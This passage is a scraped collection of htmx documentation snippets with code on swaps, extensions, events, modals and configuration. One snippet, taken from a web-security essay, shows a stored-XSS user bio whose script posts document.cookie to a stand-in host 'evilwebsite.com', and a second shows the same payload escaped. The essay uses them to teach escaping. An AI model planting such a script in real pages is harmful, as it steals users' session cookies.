hx-post=\"/contacts\" hx-target=\"#table-and-form\">\n      <label>\n        Name\n            <input name=\"name\" type=\"text\">  \n      </label>\n      <label>\n        Email\n            <input name=\"email\" type=\"email\">  \n      </label>\n    </form>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Overriding All Response Handling with HTML Meta Tag in htmx\nDESCRIPTION: This HTML snippet shows how to configure htmx to swap content for all HTTP response codes using a meta tag.  The `content` attribute defines a JSON object with a `responseHandling` array. By setting the `code` to `.*` (a regular expression matching any characters) and `swap` to `true`, all responses will be swapped into the DOM. This allows for simplified response handling, at the expense of error differentiation.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_41\n\nLANGUAGE: html\nCODE:\n```\n<meta name=\"htmx-config\" content='{\"responseHandling\": [{\"code\":\".*\", \"swap\": true}]}' /> <!--all responses are swapped-->\n```\n\n----------------------------------------\n\nTITLE: Installing Idiomorph via npm - Shell\nDESCRIPTION: This command demonstrates how to install the Idiomorph library using npm.  This installation method is suitable for projects that use npm for dependency management. After installation, you'll need to bundle the idiomorph and extension files.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/idiomorph.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install idiomorph\n```\n\n----------------------------------------\n\nTITLE: Removing an Event Listener in htmx (JavaScript)\nDESCRIPTION: This snippet demonstrates how to remove an event listener from an element using the `htmx.off()` method.  It can either take the event name and listener, or the target element, event name, and listener. The examples remove a click listener from the body and from a specific div.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/api.md#_snippet_12\n\nLANGUAGE: javascript\nCODE:\n```\n// remove this click listener from the body\nhtmx.off(\"click\", myEventListener);\n\n// remove this click listener from the given div\nhtmx.off(\"#my-div\", \"click\", myEventListener)\n```\n\n----------------------------------------\n\nTITLE: Inheriting Preload Settings\nDESCRIPTION: This snippet shows how to apply the `preload` attribute to a parent element to preload all eligible child elements.  This is helpful for preloading multiple links within a container.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/preload.md#_snippet_4\n\nLANGUAGE: HTML\nCODE:\n```\n<body hx-ext=\"preload\">\n<ul preload>\n    <li><a href=\"/server/1\">This will be preloaded because of the attribute in the node above.</a>\n    <li><a href=\"/server/2\">This will also be preloaded for the same reason.</a>\n    <li><a href=\"/server/3\">This will be preloaded, too. Lorem ipsum.</a>\n</ul>\n</body>\n```\n\n----------------------------------------\n\nTITLE: Programmatically Cancelling htmx Requests with htmx.trigger - HTML\nDESCRIPTION: This snippet showcases how to programmatically cancel an in-flight htmx request by triggering the `htmx:abort` event on the element that initiated the request.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_23\n\nLANGUAGE: html\nCODE:\n```\n<button id=\"request-button\" hx-post=\"/example\">\n    Issue Request\n</button>\n<button onclick=\"htmx.trigger('#request-button', 'htmx:abort')\">\n    Cancel Request\n</button>\n```\n\n----------------------------------------\n\nTITLE: Bootstrap Modal Content (Server Response)\nDESCRIPTION: This HTML snippet represents the server's response to the HTMX request. It contains the structure for a standard Bootstrap modal dialog, including the header, body, and footer.  The close button includes the `data-bs-dismiss=\"modal\"` attribute, which is required for the standard Bootstrap JavaScript to close the modal.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/modal-bootstrap.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<div class=\"modal-dialog modal-dialog-centered\">\n  <div class=\"modal-content\">\n    <div class=\"modal-header\">\n      <h5 class=\"modal-title\">Modal title</h5>\n    </div>\n    <div class=\"modal-body\">\n      <p>Modal body text goes here.</p>\n    </div>\n    <div class=\"modal-footer\">\n      <button type=\"button\" class=\"btn btn-secondary\" data-bs-dismiss=\"modal\">Close</button>\n    </div>\n  </div>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Receiving Multiple Events - HTML\nDESCRIPTION: This snippet demonstrates how to listen to multiple events (named or unnamed) from a single EventSource. The listeners must be either the same element that contains the `hx-ext` and `sse-connect` attributes, or child elements of the element containing the `hx-ext` and `sse-connect` attributes.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/sse.md#_snippet_6\n\nLANGUAGE: HTML\nCODE:\n```\nMultiple events in the same element\n<div hx-ext=\"sse\" sse-connect=\"/server-url\" sse-swap=\"event1,event2\"></div>\n\nMultiple events in different elements (from the same source).\n<div hx-ext=\"sse\" sse-connect=\"/server-url\">\n    <div sse-swap=\"event1\"></div>\n    <div sse-swap=\"event2\"></div>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Basic Anchor Tag Example in HTML\nDESCRIPTION: This is a basic HTML anchor tag. It demonstrates a standard link that, when clicked, navigates the browser to the specified URL using an HTTP GET request.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<a href=\"/blog\">Blog</a>\n```\n\n----------------------------------------\n\nTITLE: htmx demo example\nDESCRIPTION: This HTML snippet demonstrates how to create a basic htmx demo using the demo environment script. It includes the demo script, defines a button that makes a POST request to `/foo`, and a template that responds to the `/foo` request with dynamic content based on a global variable. A delay is also added to the response.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_46\n\nLANGUAGE: html\nCODE:\n```\n<!-- load demo environment -->\n<script src=\"https://demo.htmx.org\"></script>\n\n<!-- post to /foo -->\n<button hx-post=\"/foo\" hx-target=\"#result\">\n    Count Up\n</button>\n<output id=\"result\"></output>\n\n<!-- respond to /foo with some dynamic content in a template tag -->\n<script>\n    globalInt = 0;\n</script>\n<template url=\"/foo\" delay=\"500\"> <!-- note the url and delay attributes -->\n    ${globalInt++}\n</template>\n\n```\n\n----------------------------------------\n\nTITLE: Copy Text to Clipboard with _ attribute\nDESCRIPTION: This code snippet utilizes the _ attribute (likely from the htmx library or a similar custom attribute handler) to implement a copy-to-clipboard functionality on a button click. It retrieves the inner text of the preceding div element, writes it to the clipboard using the navigator API, updates an output element with a 'Copied!' message, waits for 2 seconds, and then clears the output element.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/rest-copypasta.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\non click\n             get the innerText of the previous <div/>\n             then writeText(the result) with the navigator's clipboard\n             put 'Copied!' into the next <output/>\n             wait 2s\n             put '' into the next <output/>\n```\n\n----------------------------------------\n\nTITLE: Handle htmx:confirm event with SweetAlert2\nDESCRIPTION: This code demonstrates how to use SweetAlert2 to handle the `htmx:confirm` event, allowing for a custom confirmation dialog. It checks if the element triggering the event has the `hx-confirm` attribute. If it does, it prevents the default request and displays the SweetAlert2 confirmation. If confirmed, it manually issues the request using `e.detail.issueRequest(true)`.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/confirm.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<script src=\"https://cdn.jsdelivr.net/npm/sweetalert2@11\"></script>\n<script>\n  document.addEventListener(\"htmx:confirm\", function(e) {\n    // The event is triggered on every trigger for a request, so we need to check if the element\n    // that triggered the request has a hx-confirm attribute, if not we can return early and let\n    // the default behavior happen\n    if (!e.detail.elt.hasAttribute('hx-confirm')) return\n\n    // This will prevent the request from being issued to later manually issue it\n    e.preventDefault()\n\n    Swal.fire({\n      title: \"Proceed?\",\n      text: `I ask you... ${e.detail.question}`\n    }).then(function(result) {\n      if (result.isConfirmed) {\n        // If the user confirms, we manually issue the request\n        e.detail.issueRequest(true); // true to skip the built-in window.confirm()\n      }\n    })\n  })\n</script>\n  \n<button hx-get=\"/confirmed\" hx-confirm=\"Some confirm text here\">\n  Click Me\n</button>\n```\n\n----------------------------------------\n\nTITLE: Enabling Logging of All htmx Events (JavaScript)\nDESCRIPTION: This snippet demonstrates how to enable logging of all htmx events using the `htmx.logAll()` method. This is useful for debugging and understanding the events that are being triggered within the htmx lifecycle.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/api.md#_snippet_9\n\nLANGUAGE: javascript\nCODE:\n```\nhtmx.logAll();\n```\n\n----------------------------------------\n\nTITLE: Handling htmx:sseClose Event in JavaScript\nDESCRIPTION: This JavaScript code snippet demonstrates how to listen for the `htmx:sseClose` event and handle different closing scenarios based on the `evt.detail.type` property.  The code uses a switch statement to handle different closing reasons, such as 'nodeMissing', 'nodeReplaced', and 'message'.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/sse.md#_snippet_11\n\nLANGUAGE: JavaScript\nCODE:\n```\ndocument.body.addEventListener('htmx:sseClose', function (e) {\n    const reason = e.detail.type\n    switch (reason) {\n        case \"nodeMissing\":\n            // Parent node is missing and therefore connection was closed\n        ...\n        case \"nodeReplaced\":\n            // Parent node replacement caused closing of connection\n        ...\n        case \"message\":\n            // connection was closed due to reception of message sse-close\n        ...\n    }\n})\n```\n\n----------------------------------------\n\nTITLE: Toggle Content Visibility with HTML Checkbox and CSS\nDESCRIPTION: This snippet demonstrates how to toggle the visibility of content using an HTML input checkbox and CSS classes, specifically using Tailwind CSS. Clicking the label toggles the checkbox, which in turn controls the visibility of the associated content.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/you-cant.md#_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\n<input id=\"published\" class=\"hidden peer\" type=\"checkbox\"/>\n<label for=\"published\" class=\"btn\">toggle content</label>\n\n<div class=\"hidden peer-checked:block\">\n    Content to be toggled when label/btn is clicked\n</div>\n```\n\n----------------------------------------\n\nTITLE: JavaScript: Fake Server-Side Delete with HTMX\nDESCRIPTION: This JavaScript code simulates server-side behavior for deleting a contact using HTMX. It defines routes and templates to handle DELETE requests and update the table dynamically.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/delete-row.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\n    //=========================================================================\n    // Fake Server Side Code\n    //=========================================================================\n\n    // data\n    var contacts = [\n      {\n        name: \"Joe Smith\",\n        email: \"joe@smith.org\",\n        status: \"Active\",\n      },\n      {\n        name: \"Angie MacDowell\",\n        email: \"angie@macdowell.org\",\n        status: \"Active\",\n      },\n      {\n        name: \"Fuqua Tarkenton\",\n        email: \"fuqua@tarkenton.org\",\n        status: \"Active\",\n      },\n      {\n        name: \"Kim Yee\",\n        email: \"kim@yee.org\",\n        status: \"Inactive\",\n      },\n    ];\n\n    // routes\n    init(\"/demo\", function(request, params){\n      return tableTemplate(contacts);\n    });\n\n    onDelete(/\\/contact\\/\\d+/, function(request, params){\n      return \"\";\n    });\n\n    // templates\n    function rowTemplate(contact, i) {\n      return `<tr>\n      <td>${contact[\"name\"]}</td>\n      <td>${contact[\"email\"]}</td>\n      <td>${contact[\"status\"]}</td>\n      <td>\n        <button class=\"btn danger\" hx-delete=\"/contact/${i}\">\n          Delete\n        </button>\n      </td>\n    </tr>`;\n    }\n\n    function tableTemplate(contacts) {\n      var rows = \"\";\n\n      for (var i = 0; i < contacts.length; i++) {\n        rows += rowTemplate(contacts[i], i, \"\");\n      }\n\n      return `\n<table class=\"table delete-row-example\">\n  <thead>\n    <tr>\n      <th>Name</th>\n      <th>Email</th>\n      <th>Status</th>\n      <th></th>\n    </tr>\n  </thead>\n  <tbody hx-confirm=\"Are you sure?\" hx-target=\"closest tr\" hx-swap=\"outerHTML swap:1s\">\n    ${rows}\n  </tbody>\n</table>`;\n    }\n\n```\n\n----------------------------------------\n\nTITLE: Implementing AJAX Request with jQuery\nDESCRIPTION: This code snippet shows an AJAX request implementation using jQuery. The behavior is spread across the HTML (button) and JavaScript files, violating LoB. Requires jQuery library to be included.  The button's action is not obvious by inspecting the HTML alone.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/locality-of-behaviour.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n  $(\"#d1\").on(\"click\", function(){\n    $.ajax({\n         /* AJAX options... */\n    });\n  });\n```\n\n----------------------------------------\n\nTITLE: Malicious HTML user bio example\nDESCRIPTION: HTML example displaying a malicious user bio containing a script element. This bio, if not properly escaped, can execute arbitrary JavaScript code when rendered, potentially compromising user data.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/web-security-basics-with-htmx.md#_snippet_3\n\nLANGUAGE: HTML\nCODE:\n```\n<p>\n<script>\n  fetch('evilwebsite.com', { method: 'POST', body: document.cookie })\n</script>\n</p>\n```\n\n----------------------------------------\n\nTITLE: htmx Installation via Unminified CDN\nDESCRIPTION: This code snippet shows how to include the unminified version of htmx in an HTML page using a CDN. The `integrity` attribute is used for Subresource Integrity (SRI) to ensure the file hasn't been tampered with.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_4\n\nLANGUAGE: HTML\nCODE:\n```\n<script src=\"https://unpkg.com/htmx.org@2.0.4/dist/htmx.js\" integrity=\"sha384-oeUn82QNXPuVkGCkcrInrS1twIxKhkZiFfr2TdiuObZ3n3yIeMiqcRzkIcguaof1\" crossorigin=\"anonymous\"></script>\n```\n\n----------------------------------------\n\nTITLE: HTML Changing the Default Swap Strategy\nDESCRIPTION: Demonstrates how to change the default swap strategy in htmx from `innerHTML` to `outerHTML` using the `htmx.config.defaultSwapStyle` configuration variable.  This configuration is set via a `<meta>` tag.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/QUIRKS.md#_snippet_2\n\nLANGUAGE: HTML\nCODE:\n```\n  <meta name=\"htmx-config\" content='{\"defaultSwapStyle\":\"outerHTML\"}'>\n```\n\n----------------------------------------\n\nTITLE: Defining hx-history-elt on a div Element\nDESCRIPTION: This HTML snippet demonstrates how to use the `hx-history-elt` attribute on a `div` element. This tells htmx to use the `div` with the ID \"content\" for snapshotting and restoring page state during navigation.  The element needs to be always visible.  The hx-history-elt attribute is not inherited.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-history-elt.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<html>\n<body>\n<div id=\"content\" hx-history-elt>\n ...\n</div>\n</body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: htmx Exposing Global Variable for Webpack\nDESCRIPTION: This code shows how to expose the htmx library as a global variable named `htmx` when using Webpack.  This is done by requiring the htmx library and assigning it to the `window.htmx` property.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\nwindow.htmx = require('htmx.org');\n```\n\n----------------------------------------\n\nTITLE: Multiple Handlers with Deprecated hx-on in HTML\nDESCRIPTION: Illustrates defining multiple event handlers using the deprecated `hx-on` syntax by separating them with newlines within the attribute value.  This syntax is discouraged in favor of `hx-on:*` or `hx-on::`.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-on.md#_snippet_5\n\nLANGUAGE: HTML\nCODE:\n```\n<button hx-get=\"/info\" hx-on=\"htmx:beforeRequest: alert('Making a request!')\n                              htmx:afterRequest: alert('Done making a request!')\">\n    Get Info!\n</button>\n```\n\n----------------------------------------\n\nTITLE: Establishing Web Socket Connection with hx-ws\nDESCRIPTION: This HTML snippet demonstrates how to establish a Web Socket connection using the `hx-ws` attribute in htmx. The `hx-ws=\"connect wss:/chatroom\"` attribute initiates a connection to the specified WebSocket server. A form within the div uses `hx-ws=\"send\"` to transmit data over the established connection.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/posts/2020-5-24-htmx-0.0.4-is-released.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n  <div hx-ws=\"connect wss:/chatroom\">\n    <div id=\"chat_room\">\n      ...\n    </div>\n    <form hx-ws=\"send\">\n        <input name=\"chat_message\">\n    </form>\n  </div>\n```\n\n----------------------------------------\n\nTITLE: Installing htmx Preload Extension via CDN\nDESCRIPTION: This code snippet demonstrates how to install the htmx preload extension using a CDN. It includes the core htmx library and the preload extension script. The `hx-ext` attribute on the `<body>` tag enables the extension.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/preload.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<head>\n    <script src=\"https://unpkg.com/htmx.org@2.0.4\" integrity=\"sha384-HGfztofotfshcF7+8n44JQL2oJmowVChPTg48S+jvZoztPfvwD79OC/LTtG6dMp+\" crossorigin=\"anonymous\"></script>\n    <script src=\"https://unpkg.com/htmx-ext-preload@2.1.0\" integrity=\"sha384-fkzubQiTB69M7XTToqW6tplvxAOJkqPl5JmLAbumV2EacmuJb8xEP9KnJafk/rg8\" crossorigin=\"anonymous\"></script>\n</head>\n<body hx-ext=\"preload\">\n...\n\n```\n\n----------------------------------------\n\nTITLE: JSON Configuring htmx to Allow 422 Response Swaps\nDESCRIPTION: Demonstrates how to configure htmx to specifically allow swapping for 422 (Unprocessable Entity) responses, while maintaining the default behavior for other status codes. This is configured with the `htmx.config.responseHandling` option.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/QUIRKS.md#_snippet_5\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"responseHandling\": [\n    {\"code\":\"422\", \"swap\": true},\n    {\"code\":\"204\", \"swap\": false},\n    {\"code\":\"[23]..\", \"swap\": true},\n    {\"code\":\"[45]..\", \"swap\": false, \"error\":true},\n    {\"code\":\"...\", \"swap\": false}]\n}\n```\n\n----------------------------------------\n\nTITLE: POST Request to Create New Contact and Redirect\nDESCRIPTION: This snippet represents a POST request to the `/contacts` endpoint, used to create a new contact. After successful creation, the server redirects the user back to the GET `/contacts` endpoint to display the updated contact list.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/hypermedia-apis-vs-data-apis.md#_snippet_1\n\nLANGUAGE: txt\nCODE:\n```\n  POST /contacts -> create the new contact, redirect to GET /contacts\n```\n\n----------------------------------------\n\nTITLE: JSON Representation of a Bank Account\nDESCRIPTION: This JSON snippet represents a bank account with its account number, balance (currency and value), and links to related resources like deposits, withdrawals, transfers, and close requests. It illustrates how hypermedia controls can be encoded within a JSON structure using a 'links' property. The client needs external information about HTTP methods and expected values.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/hateoas.md#_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"account\": {\n        \"account_number\": 12345,\n        \"balance\": {\n            \"currency\": \"usd\",\n            \"value\": 100.00\n        },\n        \"links\": {\n            \"deposits\": \"/accounts/12345/deposits\",\n            \"withdrawals\": \"/accounts/12345/withdrawals\",\n            \"transfers\": \"/accounts/12345/transfers\",\n            \"close-requests\": \"/accounts/12345/close-requests\"\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Fake Server-Side Route (JavaScript)\nDESCRIPTION: This JavaScript snippet simulates a server-side route that returns the modal HTML fragment when the `/modal` endpoint is requested.  This is used for the HTMX demo.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/modal-custom.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\n init(\"/modal\", function(request){\n\t\treturn `\n\t\t<div id=\"modal\" _=\"on closeModal add .closing wait for animationend then remove me\">\n\t\t\t<div class=\"modal-underlay\" _=\"on click trigger closeModal\"></div>\n\t\t\t<div class=\"modal-content\">\n\t\t\t\t<h1>Modal Dialog</h1>\n\t\t\t\tThis is the modal content.\n\t\t\t\tYou can put anything here, like text, or a form, or an image.\n\t\t\t\t<br>\n\t\t\t\t<br>\n\t\t\t\t<button class=\"btn danger\" _=\"on click trigger closeModal\">Close</button>\n\t\t\t</div>\n\t\t</div>\n\t\t`\n      });\n```\n\n----------------------------------------\n\nTITLE: hx-swap-oob with template, svg and circle HTML\nDESCRIPTION: This example shows how to swap SVG elements using `<template>` and `<svg>` tags.  The first template/svg block replaces circle1 inline. The second template/svg block inserts circle2 before circle1. These template and svg wrapping tags will be removed from the final content of the page.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-swap-oob.md#_snippet_6\n\nLANGUAGE: html\nCODE:\n```\n<div>\n    ...\n</div>\n<template><svg>\n    <circle hx-swap-oob=\"true\" id=\"circle1\" r=\"35\" cx=\"50\" cy=\"50\" fill=\"red\" /> \n</svg></template>\n<template><svg hx-swap-oob=\"beforebegin:#circle1\">\n    <circle id=\"circle2\" r=\"45\" cx=\"50\" cy=\"50\" fill=\"blue\" /> \n</svg></template>\n```\n\n----------------------------------------\n\nTITLE: Receiving WebSocket messages with htmx\nDESCRIPTION: This snippet demonstrates how to handle incoming WebSocket messages and update the DOM using Out-of-Band (OOB) swaps. The `hx-swap-oob` attribute is used to specify how the content should be swapped. If `hx-swap-oob` is not specified, the default behavior is `hx-swap-oob=\"true\"`.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/ws.md#_snippet_4\n\nLANGUAGE: html\nCODE:\n```\n<!-- will be interpreted as hx-swap-oob=\"true\" by default -->\n<form id=\"form\">\n    ...\n</form>\n<!-- will be appended to #notifications div -->\n<div id=\"notifications\" hx-swap-oob=\"beforeend\">\n    New message received\n</div>\n<!-- will be swapped using an extension -->\n<div id=\"chat_room\" hx-swap-oob=\"morphdom\">\n    ....\n</div>\n```\n\n----------------------------------------\n\nTITLE: Fake Server-Side Code with HTMX Routes\nDESCRIPTION: This JavaScript snippet simulates server-side routing and response generation. The `init` function defines a route for the initial button, and `onGet` defines a route for `/modal`, which returns the HTML for the modal content. These functions use HTMX to dynamically update the content.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/modal-bootstrap.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\n//=========================================================================\n// Fake Server Side Code\n//=========================================================================\n\n// routes\ninit(\"/demo\", function(request, params) {\n\t\treturn `<button\n\thx-get=\"/modal\"\n\thx-target=\"#modals-here\"\n\thx-trigger=\"click\"\n    data-bs-toggle=\"modal\"\n    data-bs-target=\"#modals-here\"\n\tclass=\"btn primary\">Open Modal</button>\n\t`})\n\n\tonGet(\"/modal\", function(request, params){\n\t  return `<div class=\"modal-dialog modal-dialog-centered\">\n    <div class=\"modal-content\">\n        <div class=\"modal-header\">\n            <h5 class=\"modal-title\">Modal title</h5>\n        </div>\n        <div class=\"modal-body\">\n            <p>Modal body text goes here.</p>\n        </div>\n    <div class=\"modal-footer\">\n        <button type=\"button\" class=\"btn btn-secondary\" data-bs-dismiss=\"modal\">Close</button>\n    </div>\n    </div>\n</div>`\n});\n```\n\n----------------------------------------\n\nTITLE: Including htmx via CDN\nDESCRIPTION: This HTML snippet demonstrates how to include the htmx library in a web page using a Content Delivery Network (CDN).  It specifies the URL to the htmx.min.js file at unpkg.com for the 2.0.0-alpha2 version.  Including htmx in this manner allows web pages to utilize htmx's attributes and features.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/posts/2024-02-09-htmx-2.0.0-alpha2-is-released.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<script src=\"https://unpkg.com/htmx.org@2.0.0-alpha2/dist/htmx.min.js\"></script>\n```\n\n----------------------------------------\n\nTITLE: htmx Extension Points\nDESCRIPTION: This JavaScript snippet outlines the available extension points that can be overridden within an htmx extension. These extension points allow developers to customize various aspects of htmx's behavior, including initialization, selector retrieval, event handling, response transformation, swap behavior, and parameter encoding.  Each function returns a default value if not overridden.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/building.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n{\n    init: function(api) {return null;},\n    getSelectors: function() {return null;},\n    onEvent : function(name, evt) {return true;},\n    transformResponse : function(text, xhr, elt) {return text;},\n    isInlineSwap : function(swapStyle) {return false;},\n    handleSwap : function(swapStyle, target, fragment, settleInfo) {return false;},\n    encodeParameters : function(xhr, parameters, elt) {return null;}\n}\n```\n\n----------------------------------------\n\nTITLE: Using Idiomorph Swap Strategies - HTML\nDESCRIPTION: This snippet demonstrates how to use the Idiomorph extension with different `hx-swap` strategies. It shows examples of using `morph`, `morph:outerHTML`, and `morph:innerHTML` to morph different parts of the DOM. The `hx-ext=\"morph\"` attribute on the `<body>` tag is necessary to enable the extension.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/idiomorph.md#_snippet_3\n\nLANGUAGE: HTML\nCODE:\n```\n<body hx-ext=\"morph\">\n\n    <button hx-get=\"/example\" hx-swap=\"morph\">\n        Morph My Outer HTML\n    </button>\n\n    <button hx-get=\"/example\" hx-swap=\"morph:outerHTML\">\n        Morph My Outer HTML\n    </button>\n    \n    <button hx-get=\"/example\" hx-swap=\"morph:innerHTML\">\n        Morph My Inner HTML\n    </button>\n\n</body>\n```\n\n----------------------------------------\n\nTITLE: Escaped HTML user bio example\nDESCRIPTION: HTML snippet demonstrating the escaped version of a malicious user bio, where special characters have been replaced with their HTML entities. This prevents the script from being executed, rendering it harmlessly as text.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/web-security-basics-with-htmx.md#_snippet_5\n\nLANGUAGE: HTML\nCODE:\n```\n<p>\n&lt;script&gt;\n  fetch(&#x27;evilwebsite.com&#x27;, { method: &#x27;POST&#x27;, data: document.cookie })\n&lt;/script&gt;\n</p>\n```\n\n----------------------------------------\n\nTITLE: hx-swap with focus-scroll:false\nDESCRIPTION: This code snippet demonstrates how to disable focus scrolling for a specific input element using `hx-swap=\"outerHTML focus-scroll:false\"` when the global configuration `htmx.config.defaultFocusScroll` is set to true.  This prevents the page from scrolling to the focused element after the request.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-swap.md#_snippet_9\n\nLANGUAGE: html\nCODE:\n```\n  <input id=\"name\" hx-get=\"/validation\" \n       hx-swap=\"outerHTML focus-scroll:false\"/>\n```\n\n----------------------------------------\n\nTITLE: Validating URLs with the htmx:validateUrl Event\nDESCRIPTION: This JavaScript snippet demonstrates using the `htmx:validateUrl` event to validate URLs before htmx issues a request. It adds an event listener to the body that checks if the request is to the same host or to 'myserver.com'. If not, it prevents the default action to block the request.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_56\n\nLANGUAGE: javascript\nCODE:\n```\ndocument.body.addEventListener('htmx:validateUrl', function (evt) {\n  // only allow requests to the current server as well as myserver.com\n  if (!evt.detail.sameHost && evt.detail.url.hostname !== \"myserver.com\") {\n    evt.preventDefault();\n  }\n});\n```\n\n----------------------------------------\n\nTITLE: Installing SSE extension via npm - Shell\nDESCRIPTION: This snippet shows how to install the htmx SSE extension using npm. After installing, you'll need to use appropriate tooling to bundle `node_modules/htmx-ext-sse/dist/sse.js` (or `.min.js`).\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/sse.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nnpm install htmx-ext-sse\n```\n\n----------------------------------------\n\nTITLE: Targeting with hx-target\nDESCRIPTION: This snippet demonstrates targeting a different element for the swap using htmx's `hx-target`. It specifies the CSS selector for the element to be updated. Requires the htmx library.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/migration-guide-intercooler.md#_snippet_19\n\nLANGUAGE: html\nCODE:\n```\nhx-target\n```\n\n----------------------------------------\n\nTITLE: Including htmx via CDN\nDESCRIPTION: This snippet shows how to include htmx 2.0.0-alpha1 in an HTML document using a CDN. This is a simple way to get started with htmx, but it's recommended to use a package manager for production environments.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/posts/2024-01-26-htmx-2.0.0-alpha1-is-released.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<script src=\"https://unpkg.com/htmx.org@2.0.0-alpha1/dist/htmx.min.js\"></script>\n```\n\n----------------------------------------\n\nTITLE: HTML Template with HTMX Archive Feature\nDESCRIPTION: This HTML snippet demonstrates a simple template that displays a contact and includes an archiving feature using HTMX. Depending on the archive state of the contact, it displays either an \"Archive\" or an \"Unarchive\" button.  Clicking the button triggers an HTTP request to a specific endpoint to update the contact's archive status. The `hx-target=\"this\"` attribute ensures that only the surrounding div is updated after the request.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/template-fragments.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<html>\n    <body>\n        <div hx-target=\"this\">\n          #if contact.archived\n          <button hx-patch=\"/contacts/${contact.id}/unarchive\">Unarchive</button>\n          #else\n          <button hx-delete=\"/contacts/${contact.id}\">Archive</button>\n          #end\n        </div>\n        <h3>Contact</h3>\n        <p>${contact.email}</p>\n    </body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Fake Server-Side Code for Sortable.js demo\nDESCRIPTION: This JavaScript code simulates server-side behavior for the Sortable.js and htmx integration demo.  It includes an `htmx.onLoad` function identical to the one presented earlier to initialize Sortable.js. It defines routes using `init` and `onPost` to handle requests to `/demo` and `/items` respectively. The `/items` route updates a `listItems` array and returns the updated list as HTML. Requires `htmx` library and `Sortable.js` library\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/sortable.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\n    htmx.onLoad(function(content) {\n        var sortables = content.querySelectorAll(\".sortable\");\n        for (var i = 0; i < sortables.length; i++) {\n          var sortable = sortables[i];\n          var sortableInstance = new Sortable(sortable, {\n              animation: 150,\n              ghostClass: 'blue-background-class',\n\n              // Make the `.htmx-indicator` unsortable\n              filter: \".htmx-indicator\",\n              onMove: function (evt) {\n                return evt.related.className.indexOf('htmx-indicator') === -1;\n              },\n\n              // Disable sorting on the `end` event\n              onEnd: function (evt) {\n                this.option(\"disabled\", true);\n              }\n          });\n\n          // Re-enable sorting on the `htmx:afterSwap` event\n          